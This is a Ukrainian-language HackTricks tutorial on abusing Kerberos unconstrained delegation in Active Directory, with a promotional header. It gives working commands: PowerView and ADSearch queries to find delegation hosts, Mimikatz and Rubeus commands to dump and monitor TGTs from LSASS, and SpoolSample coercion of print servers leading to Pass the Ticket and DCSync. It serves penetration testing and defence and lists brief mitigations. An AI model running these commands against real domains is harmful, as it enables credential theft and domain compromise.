# Неконтрольована делегація

<details>

<summary><strong>Вивчіть хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Ви працюєте в **кібербезпеці компанії**? Хочете побачити вашу **компанію рекламовану на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до [репозиторію hacktricks](https://github.com/carlospolop/hacktricks) та [репозиторію hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Неконтрольована делегація

Це функція, яку Адміністратор домену може встановити на будь-який **Комп'ютер** всередині домену. Після цього, кожного разу, коли **користувач увійде в систему** на Комп'ютер, **копія TGT** цього користувача буде **відправлена всередину TGS**, наданого DC, **та збережена в пам'яті в LSASS**. Таким чином, якщо у вас є привілеї адміністратора на машині, ви зможете **витягти квитки та видаєте себе за користувачів** на будь-якій машині.

Таким чином, якщо адміністратор домену увійшов в систему на Комп'ютері з активованою функцією "Неконтрольована делегація", і у вас є привілеї локального адміністратора на цій машині, ви зможете витягти квиток та видаєте себе за адміністратора домену де завгодно (підвищення привілеїв домену).

Ви можете **знайти об'єкти Комп'ютера з цим атрибутом**, перевіривши, чи містить атрибут [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Це можна зробити за допомогою фільтра LDAP ' (userAccountControl:1.2.840.113556.1.4.803:=524288)', це те, що робить powerview:

<pre class="language-bash"><code class="lang-bash"># Список комп'ютерів без обмежень
## Powerview
Get-NetComputer -Unconstrained #DCs завжди з'являються, але не є корисними для підвищення привілеїв
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Експорт квитків за допомогою Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Рекомендований спосіб
kerberos::list /export #Інший спосіб

# Моніторинг входів та експорт нових квитків
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Перевіряти кожні 10 секунд на нові TGTs</code></pre>

Завантажте квиток Адміністратора (або жертви користувача) в пам'ять за допомогою **Mimikatz** або **Rubeus для** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Додаткова інформація: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Додаткова інформація про неконтрольовану делегацію на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Примусова аутентифікація**

Якщо зловмисник може **компрометувати комп'ютер, дозволений для "Неконтрольованої делегації"**, він може **обманути** **Принт-сервер** для **автоматичного входу в систему** проти нього **зберігаючи TGT** в пам'яті сервера.\
Потім зловмисник може виконати **атаку Pass the Ticket для видачі себе за** користувача облікового запису комп'ютера принт-сервера.

Щоб зробити принт-сервер ввійти в систему на будь-яку машину, ви можете використати [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Якщо TGT від контролера домену, ви можете виконати атаку [**DCSync**](acl-persistence-abuse/#dcsync) та отримати всі хеші з DC.\
[**Додаткова інформація про цю атаку на ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Ось інші способи спроби примусової аутентифікації:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Пом'якшення

* Обмежте вхід DA/Admin для конкретних служб
* Встановіть "Обліковий запис є чутливим і не може бути делегованим" для привілейованих облікових записів.
